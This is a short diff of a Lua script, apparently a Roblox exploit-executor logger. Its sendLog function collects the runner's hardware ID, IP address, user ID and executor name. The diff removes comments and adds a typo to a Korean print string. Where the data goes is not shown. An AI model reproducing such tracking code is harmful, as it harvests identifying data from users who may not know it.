@@ -14,7 +14,6 @@ local function sendLog()
         return
     end
 
-    -- HWID
     local hwid = "unknown"
     if gethwid then
         hwid = tostring(gethwid())
@@ -24,7 +23,6 @@ local function sendLog()
         hwid = tostring(syn.get_hwid())
     end
 
-    -- IP (개선된 버전)
     local ip = "unknown"
     local success, err = pcall(function()
         local res = httpRequest({
@@ -46,7 +44,7 @@ local function sendLog()
     if not success then
         warn("IP 가져오기 실패:", err)
     end
-    print("가져온 IP:", ip)
+    print("가ㅈ져온 IP:", ip)
 
     local userId = player.UserId
     local executor = (identifyexecutor and identifyexecutor()) or "unknown"
